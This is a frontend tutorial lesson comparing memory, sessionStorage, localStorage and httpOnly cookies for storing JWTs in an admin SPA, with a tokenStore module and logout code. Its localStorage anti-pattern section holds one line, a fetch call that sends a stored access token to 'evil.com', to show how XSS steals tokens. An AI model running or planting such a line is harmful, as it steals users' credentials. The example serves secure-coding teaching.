# 09. Token storage: memory, localStorage, cookies

## Real-world scenario

After [08-jwt-basics.md](08-jwt-basics.md) the team argues about where to store tokens. Junior: "localStorage — simplest, survives an F5." Security: "XSS on admin = game over." Senior: "Access in memory, refresh in an httpOnly cookie — but you need a BFF." PM: "The user shouldn't have to log in every 15 minutes."

There's no silver bullet — trade-offs. The mock-exams admin SPA uses a **pragmatic** scheme: access + refresh in **memory** in dev; optionally refresh in sessionStorage to survive a reload; the production path — cookies via nginx/BFF ([35-security-client.md](35-security-client.md)).

## What you'll learn

- Comparison of **memory**, **sessionStorage**, **localStorage**, **httpOnly cookies**.
- A `tokenStore` module without React.
- Persisting refresh — pros/cons.
- Syncing with `setAccessTokenGetter` ([04-api-client.md](04-api-client.md)).
- Logout and clearing all storages.

---

## Threat model (briefly)

| Vector | memory | localStorage | httpOnly cookie |
|--------|--------|--------------|-----------------|
| XSS steal token | while the tab is open | **yes, persist** | refresh protected* |
| F5 / new tab | **access lost** | survives | survives |
| CSRF | low | low | **needs a CSRF token** |
| Dev ergonomics | medium | high | harder |

\* httpOnly — JS can't read it; XSS can't `document.cookie` the refresh.

An admin SPA with rich text / third-party scripts — be more careful with localStorage.

---

## The mock-exams recommendation (intermediate)

```text
access token   →  memory (tokenStore)
refresh token  →  memory; optional sessionStorage key "shop_refresh"
user snapshot  →  memory (+ Context)
```

After an F5 without persistence — redirect to login. For the labs the sessionStorage refresh is convenient — a **conscious compromise**, not a production default.

---

## tokenStore module

```typescript
// features/auth/tokenStore.ts
const REFRESH_KEY = "shop_admin_refresh";

let accessToken: string | null = null;
let refreshToken: string | null = null;

function loadRefreshFromSession(): string | null {
  try {
    return sessionStorage.getItem(REFRESH_KEY);
  } catch {
    return null;
  }
}

function saveRefreshToSession(token: string | null) {
  try {
    if (token) sessionStorage.setItem(REFRESH_KEY, token);
    else sessionStorage.removeItem(REFRESH_KEY);
  } catch {
    /* private mode */
  }
}

// Init on module load (optional persist)
refreshToken = loadRefreshFromSession();

export const tokenStore = {
  getAccess: () => accessToken,
  getRefresh: () => refreshToken,

  setTokens(access: string, refresh: string) {
    accessToken = access;
    refreshToken = refresh;
    saveRefreshToSession(refresh);
  },

  setAccess(access: string) {
    accessToken = access;
  },

  clear() {
    accessToken = null;
    refreshToken = null;
    saveRefreshToSession(null);
  },
};
```

**Don't** put the access token in sessionStorage — it's short-lived, and the XSS window is smaller if it's memory-only.

---

## Wire to API client

```typescript
// app/setupApiAuth.ts
import { setAccessTokenGetter } from "@/api/client";
import { tokenStore } from "@/features/auth/tokenStore";

export function setupApiAuth() {
  setAccessTokenGetter(() => tokenStore.getAccess());
}
```

Call it in `main.tsx` before render, or on `AuthProvider` mount:

```tsx
setupApiAuth();
```

---

## Login: write tokens

```typescript
// features/auth/hooks/useLoginMutation.ts — onSuccess in AuthProvider
mutation.mutate(credentials, {
  onSuccess: (data) => {
    tokenStore.setTokens(data.access, data.refresh);
    // user → Context state [10-auth-context.md]
  },
});
```

---

## Logout: clear everything

```typescript
export function logout(queryClient: QueryClient) {
  tokenStore.clear();
  queryClient.clear(); // or removeQueries for auth-sensitive ones
  // navigate /login
}
```

A forgotten refresh in sessionStorage → a "zombie re-login" after logout — a QA bug.

---

## localStorage anti-pattern (teaching example)

```typescript
// ✗ don't use in a production admin without understanding the risk
localStorage.setItem("access", access);
```

Any script on the page:

```javascript
fetch("https://evil.com/?t=" + localStorage.getItem("access"));
```

A Middle+ code review should catch `localStorage` + JWT.

---

## The httpOnly cookie path (overview)

```text
Browser  →  POST /login  →  Set-Cookie: refresh=...; HttpOnly; Secure; SameSite
SPA      →  memory access from JSON body
API      →  cookie auto on refresh endpoint (same site)
```

Requires a same-site deploy, CSRF protection, often a **BFF** (nodejs-intermediate). Django can set the cookie — the frontend config is in [36-production-build.md](36-production-build.md).

---

## Tab sync (optional)

The `storage` event on localStorage does **not** fire for memory. Multi-tab logout:

```typescript
// broadcast channel or a localStorage "logout_at" flag
window.addEventListener("storage", (e) => {
  if (e.key === "shop_logout") tokenStore.clear();
});
```

For admin — a nice-to-have.

---

## MSW and storage

MSW login returns fake tokens — the storage flow is **identical** to the real API. You can test logout without Django.

---

## Persist user snapshot

```typescript
// optional — not the JWT
sessionStorage.setItem("shop_user", JSON.stringify(user));
```

For a "admin@shop.local" header before the refresh user endpoint. Invalid if tampered with — always re-fetch `/me` if it exists.

---

## Comparison table for an interview

| Storage | Survives F5 | XSS steal | Implementation |
|---------|-------------|-----------|----------------|
| Memory | ✗ | session only | tokenStore |
| sessionStorage | ✓ tab | ✓ if stored | refresh only |
| localStorage | ✓ forever | ✓ persist | avoid access |
| httpOnly cookie | ✓ | refresh protected | BFF/cookie login |

---

## Common mistakes

1. **Access in localStorage "temporarily"** — three years in prod.

2. **Logout without clearing sessionStorage** — an auto re-auth surprise.

3. **Refresh in Authorization on GET /products** — wrong.

4. **Importing tokenStore in every component** — only the auth module + the client getter.

5. **SSR leak** — tokens in window.__INITIAL__ (Next — later).

6. **Git commit of .env with secrets** — the JWT secret is server-only.

---

## Checklist

- [ ] `tokenStore` with get/set/clear
- [ ] `setAccessTokenGetter` wired
- [ ] You understand why the access token is in memory
- [ ] Logout clears the store + Query
- [ ] You know the upgrade path to httpOnly cookies

## Next

Next lesson: [10. AuthProvider, useAuth, syncing with Query](10-auth-context.md).
